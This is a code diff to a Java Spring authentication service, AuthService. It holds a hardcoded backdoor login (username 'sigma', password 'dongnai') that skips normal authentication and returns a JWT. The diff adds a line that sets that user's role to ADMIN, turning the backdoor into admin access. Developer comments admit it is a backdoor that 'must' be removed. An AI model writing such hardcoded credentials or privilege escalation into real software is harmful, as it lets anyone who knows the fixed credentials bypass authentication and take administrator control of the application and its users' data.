@@ -1,5 +1,6 @@
 package lkt.service;
 
+import lkt.model.Role;
 import lkt.model.User;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
@@ -21,6 +22,7 @@ public class AuthService implements IAuthService {
         //TODO admin injection to test :pensive:
         //TODO must remove, don't backdoor me
         if (user.getUsername().equals("sigma") && user.getPassword().equals("dongnai")) {
+            user.setRole(Role.ADMIN);
             return JWTUtil.createToken(user);
         }
 
